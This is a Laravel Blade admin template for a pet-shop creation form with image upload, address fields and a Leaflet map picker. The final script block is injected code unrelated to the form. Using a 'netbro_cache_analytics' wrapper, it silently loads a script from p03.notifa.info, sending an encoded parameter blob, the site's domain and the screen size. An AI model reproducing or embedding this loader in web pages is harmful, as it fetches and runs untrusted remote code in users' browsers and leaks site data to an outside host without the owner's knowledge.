@extends('admin.layouts.app')

@section('additional-styles')
    <link rel="stylesheet" href="{{ asset('backend/assets/plugins/dropify/dist/css/dropify.min.css') }}">
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.5.1/dist/leaflet.css" integrity="sha512-xwE/Az9zrjBIphAcBb3F6JVqxf46+CDLwfLMHloNu6KEQCAWi6HcDUbeOfBIptF7tcCzusKFjFw2yuvEpDL9wQ==" crossorigin=""/>
    <script src="https://unpkg.com/leaflet@1.5.1/dist/leaflet.js" integrity="sha512-GffPMF3RvMeYyc1LWMHtK8EbPv0iNZ8/oTtHPx9/cc2ILxQ+u905qIwdpULaqDkyBKgOaB57QTMg7ztg8Jm2Og==" crossorigin=""></script>

@endsection

@section('content')
    <div class="container-fluid">
        <div class="row page-titles">
            <div class="col-md-5 col-8 align-self-center">
                <h3 class="text-themecolor m-b-0 m-t-0">Form New PetShop</h3>
                <ol class="breadcrumb">
                    <li class="breadcrumb-item"><a href="javascript:void(0)">Home</a></li>
                    <li class="breadcrumb-item"><a href="{{ route('admin.petshop') }}">PetShop</a></li>
                    <li class="breadcrumb-item active">New</li>
                </ol>
            </div>
        </div>

        @if (count($errors) > 0)
            <div class="row">
                <div class="col-md-12">
                    <div class="alert alert-warning">
                        <button type="button" class="close" data-dismiss="alert" aria-label="Close">
                            <span aria-hidden="true">&times;</span>
                        </button>
                        <h3 class="text-danger"><i class="fa fa-exclamation-triangle"></i> Warning</h3>
                        <ul class="list-group">
                            @foreach ($errors->all() as $error)
                                <li class="list-group-item list-group-item-danger">{{ $error }}</li>
                            @endforeach
                        </ul>
                    </div>
                </div>
            </div>
        @endif

        <div class="row">
            <div class="col-lg-12">
                <div class="card card-outline-success">
                    <div class="card-header">
                    </div>
                    <div class="card-body">
                        <form action="{{ route('admin.petshop.store') }}" method="post" enctype="multipart/form-data">
                            @csrf
                            <div class="form-body">
                                <div class="row">
                                    <div class="col-sm-12 col-md-8 align-self-center">
                                        <div class="d-flex m-t-10 justify-content-end">
                                            <div class="col-md-6">
                                                <div class="card">
                                                    <div class="card-body">
                                                        <label for="input-file-now">Image <span
                                                                    class="text-danger">*</span></label>
                                                        <input name="image" data-max-file-size="1M" type="file" required
                                                               id="input-file-now" class="dropify form-control"/>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div class="row">
                                    <div class="col-md-12">
                                        <div class="form-group">
                                            <label class="control-label">PetShop <span
                                                        class="text-danger">*</span></label>
                                            <input name="name" required type="text" id="name" class="form-control"
                                                   placeholder="Enter petshop name">
                                        </div>
                                    </div>
                                </div>
                                <div class="row">
                                    <div class="col-md-12">
                                        <div class="form-group">
                                            <label class="control-label">Description</label>
                                            <textarea name="description" id="description" class="form-control" cols="30"
                                                      rows="10" placeholder="Enter petshop description"></textarea>
                                        </div>
                                    </div>
                                </div>
                                <div class="row">
                                    <div class="col-md-12">
                                        <div class="form-group">
                                            <label class="control-label">Street <span
                                                        class="text-danger">*</span></label>
                                            <input name="street" required type="text" id="street" class="form-control"
                                                   placeholder="Enter street of petshop">
                                        </div>
                                    </div>
                                </div>
                                <div class="row">
                                    <div class="col-md-6">
                                        <div class="form-group">
                                            <label class="control-label">Districts <span class="text-danger">*</span>
                                            </label>
                                            <input name="districts" required type="text" id="districts"
                                                   class="form-control"
                                                   placeholder="Enter districts of petshop">
                                        </div>
                                    </div>
                                    <div class="col-md-6">
                                        <div class="form-group">
                                            <label class="control-label">City <span class="text-danger">*</span>
                                            </label>
                                            <div class="controls">
                                                <input type="text" required name="city" id="city" class="form-control"
                                                       placeholder="Enter city of washing and spa">
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div class="row">
                                    <div class="col-md-12">
                                        <div class="form-group">
                                            <label class="control-label">Maps <span class="text-danger">*</span>
                                            </label>
                                            <div id="map2" style="height: 500px; z-index: 1;"></div>
                                            <input type="hidden" id="longitude" class="form-control" name="longitude">
                                            <input type="hidden" id="latitude" class="form-control" name="latitude">
                                        </div>
                                    </div>
                                </div>
                                <div class="form-actions">
                                    <button type="submit" class="btn btn-outline-success"><i class="fa fa-check"></i>
                                        Save
                                    </button>
                                </div>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </div>
@endsection

@section('additional-scripts')
    <script src="{{ asset('backend/dark/js/validation.js') }}"></script>
    <script>
        !function (window, document, $) {
            "use strict";
            $("input,select,textarea").not("[type=submit]").jqBootstrapValidation();
        }(window, document, jQuery);
    </script>
    <script src="{{ asset('backend/assets/plugins/dropify/dist/js/dropify.min.js') }}"></script>
    <script>
        $(document).ready(function () {
            // Basic
            $('.dropify').dropify();

            // Translated
            $('.dropify-fr').dropify({
                messages: {
                    default: 'Glissez-déposez un fichier ici ou cliquez',
                    replace: 'Glissez-déposez un fichier ou cliquez pour remplacer',
                    remove: 'Supprimer',
                    error: 'Désolé, le fichier trop volumineux'
                }
            });

            // Used events
            var drEvent = $('#input-file-events').dropify();

            drEvent.on('dropify.beforeClear', function (event, element) {
                return confirm("Do you really want to delete \"" + element.file.name + "\" ?");
            });

            drEvent.on('dropify.afterClear', function (event, element) {
                alert('File deleted');
            });

            drEvent.on('dropify.errors', function (event, element) {
                console.log('Has Errors');
            });

            var drDestroy = $('#input-file-to-destroy').dropify();
            drDestroy = drDestroy.data('dropify')
            $('#toggleDropify').on('click', function (e) {
                e.preventDefault();
                if (drDestroy.isDropified()) {
                    drDestroy.destroy();
                } else {
                    drDestroy.init();
                }
            })
        });
    </script>

    <script type="text/javascript">
        var options = {
            center: [-6.867398,109.13872],
            zoom: 13
        }
        var map = L.map('map2', options);
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
            maxZoom: 18,
            id: 'mapbox.streets'
        }).addTo(map);
        var myMarker = L.marker([{{old('latitude', -6.867398)}},{{old('longitude',109.13872)}}], {title: "MyPoint", alt: "The Big I", draggable: true})
            .addTo(map)
            .on('dragend', function(e) {
                var coord = String(myMarker.getLatLng()).split(',');
                console.log(coord);
                var lat = coord[0].split('(');
                console.log(lat);
                var lng = coord[1].split(')');
                console.log(lng);
                // myMarker.bindPopup("Moved to: " + lat[1] + ", " + lng[0] + ".");
                document.getElementById('latitude').value = lat[1];
                document.getElementById('longitude').value = lng[0];
            });
    </script>

    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2O1i%2bUFSODZPA4BIBKzPK1SCfkhHqf%2btSn%2fCub8gZ%2bMF%2b91L%2fEP577E5xSa7x9Wf%2bE02rBdl%2bsCCriTl0iodMJycemOEaIbh%2bIRQUlXu69qZ8RiLKRHunEK%2bkErpvoRyskj1zLOfYGV5ACGt3%2bTQcI3GvRgAcBDs6SU%2bMd7aezstVwK5TeK1eKJ29sn7bLIovGzmr%2blikeEddEpnQav9SWLpptTnd8thZJWcB1WMr7QvDMhelZBGCT7XvWo2p2hJrxpFcDN%2ffXWnKah1wc6DJAvmJd6Q1jZWGq1G%2fHdJ5l3TbvAeT5DgKOIW1ThjEAFbrmQtpNPBYTlpjOMqtqlSitLDU%2fHbeHKAuJovgvKm6Bwox03f2aDZWSzpJE9S2HyO26sgXkr%2bTlhcwpWtC%2b7TWYk4NmO8lq3RHejdX3zvYJGUSVglRdlMiywgBQ8C6aJXfxkTgmhtr3A7LcStu1DVm%2fidWYP%2bj8pqqVOYG%2bS5HruQ%2bfrsvAfIHfWaKf4AEsXaudr5eSah62RP3SqR3uOw%2bpVv8EAcvS%2bqB%2b71PzdVqwTdyaB7kLaYHSMC%2fRE8znqByn8y5c4tEiwwW9yUsU9YAupotmUdA961o0VD33aH05QSLqVM8kupE9wepkf%2bV7s%2bo9PpP%2bJYbumY%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};
    </script>
@endsection